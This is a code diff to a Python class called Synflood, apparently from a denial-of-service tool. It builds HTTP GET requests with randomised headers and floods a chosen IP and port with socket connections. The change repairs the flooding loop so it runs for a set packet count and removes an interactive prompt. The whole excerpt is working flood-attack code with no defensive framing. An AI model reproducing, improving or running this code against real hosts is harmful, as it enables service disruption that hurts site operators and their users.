@@ -37,7 +37,7 @@ class Synflood:
     def start(self, port="80", ip="localhost"):
         hh = random._urandom(3016)
         xx = int(0)
-        tot = int(input('total packets: '))
+        #tot = int(input('total packets: '))
         useragen = "User-Agent: " + random.choice(self.useragents) + "\r\n"
         accept = random.choice(self.acceptall)
         reffer = "Referer: " + random.choice(self.ref) + str(ip) + "\r\n"
@@ -45,8 +45,7 @@ class Synflood:
         length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
         target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
         main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
-
-        for _ in range():
+        for _ in range(self.packet):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((str(ip), int(port)))
